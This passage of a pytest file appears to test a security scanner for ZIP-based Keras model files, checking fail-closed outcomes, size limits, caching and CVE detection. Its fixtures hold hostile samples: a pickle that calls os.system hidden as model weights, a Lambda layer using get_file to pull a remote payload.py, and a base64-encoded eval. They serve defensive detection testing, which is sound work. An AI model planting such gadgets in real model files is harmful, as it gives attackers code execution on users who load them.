            and issue.details.get("entry") == "model.weights.h5"
            for issue in result.issues
        )
        assert not any(check.name == "H5PY Library Check" for check in result.checks)
        assert not any(
            issue.rule_code == "S901" and issue.details.get("embedded_weights_hdf5_userblock")
            for issue in result.issues
        )

    def test_oversized_userblock_embedded_weights_missing_h5py_fails_closed(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Missing h5py must fail closed when a bounded probe cannot rule out a large HDF5 user block."""
        hdf5_signature_offset = 16 * 1024 * 1024
        assert hdf5_signature_offset > HDF5_SIGNATURE_SCAN_MAX_BYTES
        weights_payload = bytearray(hdf5_signature_offset + 8)
        weights_payload[hdf5_signature_offset : hdf5_signature_offset + 8] = b"\x89HDF\r\n\x1a\n"
        keras_path = tmp_path / "oversized_userblock.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.12.0"}))
            zf.writestr("model.weights.h5", bytes(weights_payload))

        monkeypatch.setattr(keras_zip_scanner_module, "HAS_H5PY", False)
        monkeypatch.setattr(keras_h5_scanner_module, "HAS_H5PY", False)
        reason = "keras_zip_embedded_weights_hdf5_signature_probe_incomplete"

        result = KerasZipScanner().scan(str(keras_path))

        assert result.success is False
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert reason in result.metadata["scan_outcome_reasons"]
        assert any(
            check.name == "Embedded Weights HDF5 Signature Probe"
            and check.status == CheckStatus.FAILED
            and check.details["hdf5_signature_probe_max_bytes"] == HDF5_SIGNATURE_SCAN_MAX_BYTES
            and check.details["scan_outcome_reason"] == reason
            for check in result.checks
        )
        assert not any(check.name == "H5PY Library Check" for check in result.checks)
        assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)

    def test_oversized_non_hdf5_weights_preserve_generic_pickle_scan(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Probe-incomplete weights must still report generic pickle findings before failing closed."""
        pickle_payload = b'cos\nsystem\n(S"echo pwned"\ntR.'
        payload_size = (16 * 1024 * 1024) + 8
        weights_payload = pickle_payload + bytes(payload_size - len(pickle_payload))
        keras_path = tmp_path / "oversized_disguised_pickle.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.12.0"}))
            zf.writestr("model.weights.h5", weights_payload)

        monkeypatch.setattr(keras_zip_scanner_module, "HAS_H5PY", False)
        monkeypatch.setattr(keras_h5_scanner_module, "HAS_H5PY", False)
        reason = "keras_zip_embedded_weights_hdf5_signature_probe_incomplete"

        result = KerasZipScanner().scan(str(keras_path))

        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert reason in result.metadata["scan_outcome_reasons"]
        pickle_issues = [
            issue
            for issue in result.issues
            if issue.rule_code == "S201"
            and issue.details.get("zip_entry") == "model.weights.h5"
            and any(global_name in issue.message.lower() for global_name in ("os.system", "posix.system", "nt.system"))
        ]
        assert pickle_issues
        assert not any(issue.details.get("embedded_weights_hdf5_userblock") for issue in pickle_issues)
        assert not any(check.name == "H5PY Library Check" for check in result.checks)

    def test_oversized_non_hdf5_weights_preserve_nested_archive_dispatch(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Probe-incomplete weights must retain content-routed nested scanning."""
        nested_zip_path = tmp_path / "disguised_weights.zip"
        with zipfile.ZipFile(nested_zip_path, "w") as nested_zip:
            nested_zip.writestr("payload.pkl", b'cos\nsystem\n(S"echo pwned"\ntR.')
            nested_zip.writestr("padding.bin", bytes(16 * 1024 * 1024))

        assert nested_zip_path.stat().st_size > HDF5_SIGNATURE_SCAN_MAX_BYTES
        keras_path = tmp_path / "oversized_disguised_zip.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.12.0"}))
            zf.write(nested_zip_path, "model.weights.h5")

        monkeypatch.setattr(keras_zip_scanner_module, "HAS_H5PY", False)
        monkeypatch.setattr(keras_h5_scanner_module, "HAS_H5PY", False)
        reason = "keras_zip_embedded_weights_hdf5_signature_probe_incomplete"

        result = KerasZipScanner().scan(str(keras_path))

        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert reason in result.metadata["scan_outcome_reasons"]
        assert any(
            issue.rule_code == "S201"
            and issue.details.get("zip_entry") == "model.weights.h5:payload.pkl"
            and any(global_name in issue.message.lower() for global_name in ("os.system", "posix.system", "nt.system"))
            for issue in result.issues
        )
        assert not any(check.name == "H5PY Library Check" for check in result.checks)

    def test_non_hdf5_weights_before_next_legal_signature_offset_avoid_hdf5_failure(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """A size above the byte cap must not fail HDF5 checks when every legal offset was probed."""
        weights_payload = bytes(HDF5_SIGNATURE_SCAN_MAX_BYTES + 1)
        keras_path = tmp_path / "large_non_hdf5_weights.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.12.0"}))
            zf.writestr("model.weights.h5", weights_payload)

        monkeypatch.setattr(keras_zip_scanner_module, "HAS_H5PY", False)
        monkeypatch.setattr(keras_h5_scanner_module, "HAS_H5PY", False)

        result = KerasZipScanner(config={"scanners": ["keras_zip"]}).scan(str(keras_path))

        assert result.success is True
        assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
        assert not any(check.name == "Embedded Weights HDF5 Signature Probe" for check in result.checks)
        assert not any(check.name == "Embedded Weights H5PY Library Check" for check in result.checks)
        assert not any(check.name == "H5PY Library Check" for check in result.checks)

    def test_missing_h5py_without_embedded_weights_stays_conclusive(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Archives without embedded HDF5 weights do not require h5py for this check."""
        monkeypatch.setattr(keras_zip_scanner_module, "HAS_H5PY", False)
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version="3.12.0",
        )

        result = KerasZipScanner().scan(str(keras_path))

        assert result.success is True
        assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
        assert not any(check.name == "Embedded Weights H5PY Library Check" for check in result.checks)

    def test_missing_h5py_does_not_hide_disguised_pickle_weights(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Non-HDF5 weights still receive generic nested scanning without h5py."""
        monkeypatch.setattr(keras_zip_scanner_module, "HAS_H5PY", False)
        monkeypatch.setattr(keras_h5_scanner_module, "HAS_H5PY", False)
        keras_path = tmp_path / "disguised_pickle_weights.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.12.0"}))
            zf.writestr("model.weights.h5", b'cos\nsystem\n(S"echo pwned"\ntR.')

        result = KerasZipScanner().scan(str(keras_path))

        assert any(
            issue.rule_code == "S201"
            and issue.details.get("zip_entry") == "model.weights.h5"
            and any(global_name in issue.message.lower() for global_name in ("os.system", "posix.system", "nt.system"))
            for issue in result.issues
        )
        assert not any(check.name == "Embedded Weights H5PY Library Check" for check in result.checks)
        assert not any(check.name == "H5PY Library Check" for check in result.checks)

    @pytest.mark.parametrize(
        ("config", "reason", "expected_check_name"),
        [
            (None, "keras_zip_config_invalid_type", "Model Config Type Validation"),
            ([], "keras_zip_config_invalid_type", "Model Config Type Validation"),
            (
                {"class_name": "Sequential", "config": None},
                "keras_zip_model_config_structure_invalid",
                "Model Config Structure Validation",
            ),
            (
                {"class_name": "Sequential", "config": "layers hidden in wrong type"},
                "keras_zip_model_config_structure_invalid",
                "Model Config Structure Validation",
            ),
            (
                {"class_name": "Sequential", "config": {"layers": "layers hidden in wrong type"}},
                "keras_zip_model_layers_invalid_type",
                "Layers Type Validation",
            ),
            (
                {"class_name": "Sequential", "config": {"layers": ["not a layer dict"]}},
                "keras_zip_model_layer_invalid_type",
                "Layer Type Validation",
            ),
            (
                {"class_name": "Sequential", "config": {"layer": "not a layer dict"}},
                "keras_zip_model_layer_invalid_type",
                "Single Layer Type Validation",
            ),
            (
                {"class_name": "Sequential", "config": {"layers": []}, "compile_config": ["not", "a", "dict"]},
                "keras_zip_compile_config_invalid_type",
                "Compile Config Type Validation",
            ),
        ],
    )
    def test_invalid_config_json_structure_returns_inconclusive_exit2(
        self,
        tmp_path: Path,
        config: Any,
        reason: str,
        expected_check_name: str,
    ) -> None:
        """Keras ZIP config.json shapes that cannot be fully traversed should fail closed."""
        keras_path = create_configured_keras_zip(
            tmp_path,
            config,
            file_name=f"{reason}.keras",
        )

        _assert_inconclusive_keras_zip_scan(keras_path, reason, expected_check_name)

    def test_invalid_config_json_list_still_detects_get_file_gadget(self, tmp_path: Path) -> None:
        """List-root configs are incomplete but can still contain structured CVE evidence."""
        keras_path = create_configured_keras_zip(
            tmp_path,
            [
                {
                    "class_name": "Lambda",
                    "config": {
                        "fn": "get_file",
                        "kwargs": {"origin": "https://example.invalid/payload.py"},
                    },
                }
            ],
            file_name="list_get_file.keras",
        )

        result = KerasZipScanner().scan(str(keras_path))
        aggregate_result = scan_model_directory_or_file(
            str(keras_path),
            config={"cache_scan_results": False},
        )

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-8747"]
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_config_invalid_type" in result.metadata["scan_outcome_reasons"]
        assert len(cve_issues) == 1
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert determine_exit_code(aggregate_result) == 1

    def test_invalid_config_json_list_still_checks_embedded_hdf5_weights(self, tmp_path: Path) -> None:
        """Invalid config structure must not skip independent embedded weights checks."""
        keras_path = create_configured_keras_zip(
            tmp_path,
            [],
            keras_version="3.12.0",
            file_name="list_with_external_weights.keras",
            weights_h5_path=create_external_link_weights_h5(tmp_path),
        )

        result = KerasZipScanner().scan(str(keras_path))
        aggregate_result = scan_model_directory_or_file(
            str(keras_path),
            config={"cache_scan_results": False},
        )

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2026-1669"]
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_config_invalid_type" in result.metadata["scan_outcome_reasons"]
        assert len(cve_issues) == 1
        assert cve_issues[0].severity == IssueSeverity.WARNING
        assert determine_exit_code(aggregate_result) == 1

    def test_invalid_config_json_list_fixed_keras_weights_preserves_external_ref_warning(self, tmp_path: Path) -> None:
        """Independent embedded-weight findings should survive invalid config and fixed-looking metadata."""
        keras_path = create_configured_keras_zip(
            tmp_path,
            [],
            keras_version="3.12.1",
            file_name="fixed_list_with_external_weights.keras",
            weights_h5_path=create_external_link_weights_h5(tmp_path),
        )

        aggregate_result = scan_model_directory_or_file(
            str(keras_path),
            config={"cache_scan_results": False},
        )

        metadata = aggregate_result.file_metadata[str(keras_path)]
        security_issues = [
            issue
            for issue in aggregate_result.issues
            if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        ]
        assert metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_config_invalid_type" in metadata.get("scan_outcome_reasons")
        cve_issues = [issue for issue in security_issues if issue.details.get("cve_id") == "CVE-2026-1669"]
        assert len(cve_issues) == 1
        assert cve_issues[0].details["keras_version"] == "3.12.1"
        assert cve_issues[0].details["parse_status"] == "metadata_non_vulnerable"
        assert cve_issues[0].details["metadata_only_assessment"] is True
        assert determine_exit_code(aggregate_result) == 1

    def test_missing_config_json_returns_inconclusive_exit2(self, tmp_path: Path) -> None:
        """A direct Keras ZIP scan without config.json cannot be security-complete."""
        keras_path = tmp_path / "missing_config.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.13.2"}))

        result = KerasZipScanner().scan(str(keras_path))

        assert result.success is False
        assert result.has_errors is False
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_config_missing" in result.metadata["scan_outcome_reasons"]
        assert any(
            check.name == "Keras ZIP Format Check" and check.status == CheckStatus.FAILED for check in result.checks
        )

    def test_recursive_member_scan_reuses_preflighted_archive_after_path_replacement(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            file_name="same_descriptor.keras",
        )
        with zipfile.ZipFile(keras_path, "a") as archive:
            archive.writestr("safe.txt", "safe")

        replacement_path = tmp_path / "replacement.keras"
        with zipfile.ZipFile(replacement_path, "w") as archive:
            archive.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo replacement"\ntR.')

        original_scan_archive_members = keras_zip_scanner_module.ZipScanner.scan_archive_members
        original_open = builtins.open
        path_reopened = False

        def redirect_path_open(file: Any, *args: Any, **kwargs: Any) -> Any:
            nonlocal path_reopened
            if str(file) == str(keras_path):
                path_reopened = True
                file = replacement_path
            return original_open(file, *args, **kwargs)

        def replace_then_scan(
            scanner: keras_zip_scanner_module.ZipScanner,
            path: str,
            archive: zipfile.ZipFile | None = None,
        ) -> ScanResult:
            assert archive is not None
            with monkeypatch.context() as path_swap:
                path_swap.setattr(builtins, "open", redirect_path_open)
                return original_scan_archive_members(scanner, path, archive=archive)

        monkeypatch.setattr(keras_zip_scanner_module.ZipScanner, "scan_archive_members", replace_then_scan)

        result = KerasZipScanner().scan(str(keras_path))

        assert path_reopened is False
        assert not any(issue.details.get("zip_entry") == "payload.pkl" for issue in result.issues)
        assert any(entry.get("path", "").endswith(":safe.txt") for entry in result.metadata["contents"])
        assert not any(entry.get("path", "").endswith(":payload.pkl") for entry in result.metadata["contents"])

    def test_read_failure_returns_inconclusive_exit2(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Unavailable Keras ZIP content is incomplete analysis, not a security finding."""
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            file_name="unavailable_content.keras",
        )

        raw_secret = "ATTACKER_CONTROLLED_KERAS_ZIP_READ_FAILURE"

        def raise_os_error(
            _self: KerasZipScanner,
            _archive: zipfile.ZipFile,
            _member_name: str,
        ) -> None:
            raise OSError(raw_secret)

        monkeypatch.setattr(KerasZipScanner, "_get_archive_member_info", raise_os_error)

        _assert_inconclusive_keras_zip_scan(keras_path, "keras_zip_read_failed", "Keras ZIP File Read")
        result = KerasZipScanner().scan(str(keras_path))
        read_checks = [check for check in result.checks if check.name == "Keras ZIP File Read"]
        assert read_checks
        assert read_checks[0].details["exception"] == "<redacted>"
        assert "<redacted>" in read_checks[0].message
        assert raw_secret not in result.to_json()
        assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)
        _assert_inconclusive_keras_zip_scan_not_cached(
            keras_path,
            "keras_zip_read_failed",
            tmp_path / "read-failure-cache",
        )

    @pytest.mark.parametrize(
        ("failure_kind", "expected_reason"),
        [("read", "keras_zip_read_failed"), ("scan", "keras_zip_scan_failed")],
    )
    def test_primary_failure_still_recurses_detectable_payload(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        failure_kind: str,
        expected_reason: str,
    ) -> None:
        """Unavailable Keras analysis must not hide independently detectable ZIP payloads."""
        keras_path = tmp_path / "unavailable_config_with_payload.keras"
        with zipfile.ZipFile(keras_path, "w") as archive:
            archive.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo pwned"\ntR.')

        if failure_kind == "read":

            def raise_os_error(
                _self: KerasZipScanner,
                _archive: zipfile.ZipFile,
                _member_name: str,
            ) -> None:
                raise OSError("simulated Keras ZIP member read failure")

            monkeypatch.setattr(KerasZipScanner, "_get_archive_member_info", raise_os_error)
        else:

            def raise_runtime_error(_self: KerasZipScanner, _model_config: dict[str, Any], _result: Any) -> None:
                raise RuntimeError("simulated unexpected Keras ZIP scan failure")

            monkeypatch.setattr(KerasZipScanner, "_scan_model_config", raise_runtime_error)

        result = scan_model_directory_or_file(str(keras_path), cache_enabled=False)
        metadata = result.file_metadata[str(keras_path)]

        assert expected_reason in metadata["scan_outcome_reasons"]
        assert any(
            issue.severity == IssueSeverity.CRITICAL
            and issue.details.get("zip_entry") == "payload.pkl"
            and any(symbol in issue.message.lower() for symbol in ("os.system", "posix.system"))
            for issue in result.issues
        )
        assert determine_exit_code(result) == 1

    @pytest.mark.parametrize(
        ("failure_kind", "expected_reason"),
        [("read", "keras_zip_read_failed"), ("scan", "keras_zip_scan_failed")],
    )
    def test_primary_failure_does_not_cache_temporary_recursive_member(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        failure_kind: str,
        expected_reason: str,
    ) -> None:
        """Fallback recursion must not cache extracted members that are immediately deleted."""
        keras_path = tmp_path / f"{failure_kind}_failure_with_benign_payload.keras"
        with zipfile.ZipFile(keras_path, "w") as archive:
            archive.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            archive.writestr("payload.pkl", b"\x80\x04N.")

        if failure_kind == "read":

            def raise_os_error(
                _self: KerasZipScanner,
                _archive: zipfile.ZipFile,
                _member_name: str,
            ) -> None:
                raise OSError("simulated Keras ZIP member read failure")

            monkeypatch.setattr(KerasZipScanner, "_get_archive_member_info", raise_os_error)
        else:

            def raise_runtime_error(_self: KerasZipScanner, _model_config: dict[str, Any], _result: Any) -> None:
                raise RuntimeError("simulated unexpected Keras ZIP scan failure")

            monkeypatch.setattr(KerasZipScanner, "_scan_model_config", raise_runtime_error)

        _assert_inconclusive_keras_zip_scan_not_cached(
            keras_path,
            expected_reason,
            tmp_path / f"{failure_kind}-recursive-member-cache",
        )

    def test_unexpected_scan_failure_returns_inconclusive_exit2_without_cache(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Unexpected unavailable ZIP analysis is incomplete, not a critical model finding."""
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            file_name="unexpected_scan_failure.keras",
        )

        def fail_config_scan(_self: KerasZipScanner, _model_config: dict[str, Any], _result: Any) -> None:
            raise RuntimeError("simulated unexpected Keras ZIP scan failure")

        monkeypatch.setattr(KerasZipScanner, "_scan_model_config", fail_config_scan)

        _assert_inconclusive_keras_zip_scan(keras_path, "keras_zip_scan_failed", "Keras ZIP File Scan")
        result = KerasZipScanner().scan(str(keras_path))
        assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)
        _assert_inconclusive_keras_zip_scan_not_cached(
            keras_path,
            "keras_zip_scan_failed",
            tmp_path / "scan-failure-cache",
        )

    def test_malformed_config_json_returns_inconclusive_exit2(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Malformed config.json without security evidence should exit 2, not 1."""
        raw_secret = "ATTACKER_CONTROLLED_KERAS_ZIP_PARSE_FAILURE"
        keras_path = tmp_path / "malformed_config.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", "{ invalid json }")

        def fail_json_loads(_value: Any) -> Any:
            raise ValueError(raw_secret)

        monkeypatch.setattr(keras_zip_scanner_module.json, "loads", fail_json_loads)

        _assert_inconclusive_keras_zip_scan(
            keras_path,
            "keras_zip_config_parse_failed",
            "Config JSON Parsing",
        )
        result = KerasZipScanner().scan(str(keras_path))
        parse_checks = [check for check in result.checks if check.name == "Config JSON Parsing"]
        assert parse_checks
        assert parse_checks[0].details["error"] == "<redacted>"
        assert "<redacted>" in parse_checks[0].message
        assert raw_secret not in result.to_json()
        assert not any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)

    def test_inconclusive_compile_config_preserves_security_exit1(self, tmp_path: Path) -> None:
        """Security findings should still take precedence over incomplete compile_config analysis."""
        encoded_code = base64.b64encode(b"eval('1')").decode()
        keras_path = create_configured_keras_zip(
            tmp_path,
            {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": "Lambda",
                            "name": "lambda_1",
                            "config": {"function": [encoded_code, None, None]},
                        }
                    ]
                },
                "compile_config": ["not", "a", "dict"],
            },
            keras_version="2.12.0",
            file_name="lambda_with_invalid_compile_config.keras",
        )

        result = KerasZipScanner().scan(str(keras_path))
        audit_result = scan_model_directory_or_file(str(keras_path))

        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_compile_config_invalid_type" in result.metadata["scan_outcome_reasons"]
        assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
        assert determine_exit_code(audit_result) == 1

    def test_inconclusive_config_scan_outcome_uncached_rerun_preserves_exit2(
        self,
        tmp_path: Path,
    ) -> None:
        """Uncached Keras ZIP inconclusive results must still produce exit 2 on subsequent scans."""
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": "not a list"}},
            file_name="cached_bad_config.keras",
        )
        cache_dir = tmp_path / "cache"

        reset_cache_manager()
        first_result = scan_model_directory_or_file(
            str(keras_path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second_result = scan_model_directory_or_file(
            str(keras_path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        metadata = second_result.file_metadata[str(keras_path)]

        assert determine_exit_code(first_result) == 2
        assert determine_exit_code(second_result) == 2
        assert metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_model_layers_invalid_type" in metadata.get("scan_outcome_reasons")
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0

    def test_embedded_weights_size_limit_prevents_unbounded_extraction(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Oversized embedded weights should be skipped before extraction to a temp file."""
        monkeypatch.setattr(keras_zip_scanner_module, "HAS_H5PY", True)

        scanner = KerasZipScanner({"max_embedded_weights_bytes": 1024})
        keras_path = tmp_path / "oversized_weights.keras"
        with zipfile.ZipFile(keras_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.12.0"}))
            zf.writestr("model.weights.h5", b"0" * 4096)

        result = scanner.scan(str(keras_path))

        limit_checks = [check for check in result.checks if check.name == "Embedded Weights Size Limit"]
        assert len(limit_checks) == 1
        assert limit_checks[0].status == CheckStatus.FAILED
        assert limit_checks[0].details["uncompressed_size"] == 4096
        assert limit_checks[0].details["max_embedded_weights_bytes"] == 1024
        assert result.success is False
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_embedded_weights_too_large" in result.metadata["scan_outcome_reasons"]
        assert not any(issue.details.get("cve_id") == "CVE-2026-1669" for issue in result.issues)

    def test_embedded_weights_size_skip_preserves_zip_bomb_detection(self, tmp_path: Path) -> None:
        keras_path = tmp_path / "compressed_oversized_weights.keras"
        with zipfile.ZipFile(keras_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.12.0"}))
            zf.writestr("model.weights.h5", b"0" * ((1024 * 1024) + 1))

        result = KerasZipScanner({"max_embedded_weights_bytes": 1024}).scan(str(keras_path))

        assert any(
            check.name == "Compression Ratio Check"
            and check.status == CheckStatus.FAILED
            and check.details["entry"] == "model.weights.h5"
            and check.rule_code == "S410"
            for check in result.checks
        )

    def test_configured_recursive_member_skip_is_never_clean(self, tmp_path: Path) -> None:
        keras_path = tmp_path / "configured_skip.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.12.0"}))

        result = KerasZipScanner({"skip_archive_entries": ["metadata.json"]}).scan(str(keras_path))

        assert result.success is False
        assert "zip_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
        assert any(
            check.name == "ZIP Member Analysis Coverage"
            and check.status == CheckStatus.FAILED
            and check.details["entry"] == "metadata.json"
            for check in result.checks
        )

    def test_embedded_weights_size_limit_runs_without_h5py(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """The size-limit fail-closed reason does not require optional HDF5 parsing."""
        monkeypatch.setattr(keras_zip_scanner_module, "HAS_H5PY", False)

        scanner = KerasZipScanner({"max_embedded_weights_bytes": 1024})
        keras_path = tmp_path / "oversized_weights_without_h5py.keras"
        with zipfile.ZipFile(keras_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.12.0"}))
            zf.writestr("model.weights.h5", b"0" * 4096)

        result = scanner.scan(str(keras_path))

        limit_checks = [check for check in result.checks if check.name == "Embedded Weights Size Limit"]
        assert len(limit_checks) == 1
        assert result.success is False
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_embedded_weights_too_large" in result.metadata["scan_outcome_reasons"]

    def test_embedded_weights_size_limit_returns_exit2_and_skips_cache(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Oversized embedded weights must fail closed at the aggregate/cache boundary."""
        monkeypatch.setattr(keras_zip_scanner_module, "HAS_H5PY", True)

        keras_path = tmp_path / "cached_oversized_weights.keras"
        with zipfile.ZipFile(keras_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.12.0"}))
            zf.writestr("model.weights.h5", b"0" * 4096)
        cache_dir = tmp_path / "cache"

        reset_cache_manager()
        first_result = scan_model_directory_or_file(
            str(keras_path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
            max_embedded_weights_bytes=1024,
        )
        second_result = scan_model_directory_or_file(
            str(keras_path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
            max_embedded_weights_bytes=1024,
        )
        metadata = second_result.file_metadata[str(keras_path)]

        assert determine_exit_code(first_result) == 2
        assert determine_exit_code(second_result) == 2
        assert metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_embedded_weights_too_large" in metadata.get("scan_outcome_reasons")
        assert any(
            issue.message.startswith("Skipping embedded model.weights.h5 inspection") for issue in second_result.issues
        )
        assert not any(
            issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in second_result.issues
        )
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0

    @pytest.mark.parametrize(
        "scanner_config",
        [
            {"max_embedded_weights_bytes": "1024"},
            {"max_embedded_weights_bytes": None},
            {"max_embedded_weights_bytes": True},
            {"max_file_read_size": "2048"},
        ],
    )
    def test_invalid_embedded_weight_limit_config_uses_default(
        self,
        tmp_path: Path,
        scanner_config: dict[str, Any],
    ) -> None:
        """Invalid size-limit config values should not crash scans or force bogus 1-byte limits."""
        scanner = KerasZipScanner(scanner_config)
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version="3.13.2",
            weights_h5_path=create_regular_weights_h5(tmp_path),
        )

        result = scanner.scan(str(keras_path))

        assert scanner.max_embedded_weights_bytes == KerasZipScanner.MAX_EMBEDDED_WEIGHTS_BYTES
        assert result.success
        assert all(check.name != "Embedded Weights Size Limit" for check in result.checks)
        assert not any(check.name == "Keras ZIP File Scan" for check in result.checks)

    def test_can_handle_keras_zip(self, tmp_path: Path) -> None:
        """Test that scanner can identify ZIP-based .keras files."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "model.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            config = {"class_name": "Sequential", "config": {"layers": []}}
            zf.writestr("config.json", json.dumps(config))
            metadata = {"keras_version": "3.0.0"}
            zf.writestr("metadata.json", json.dumps(metadata))

        assert scanner.can_handle(str(keras_path))

    def test_can_handle_keras_zip_with_only_config_json(self, tmp_path: Path) -> None:
        """A real .keras suffix should still route to the Keras scanner with only config.json."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "config_only.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            config = {"class_name": "Sequential", "config": {"layers": []}}
            zf.writestr("config.json", json.dumps(config))

        assert scanner.can_handle(str(keras_path))

    def test_scan_normalized_config_member_and_recurses_embedded_pickle(self, tmp_path: Path) -> None:
        """Normalized ./config.json members should still receive Keras and recursive ZIP scans."""
        scanner = KerasZipScanner()
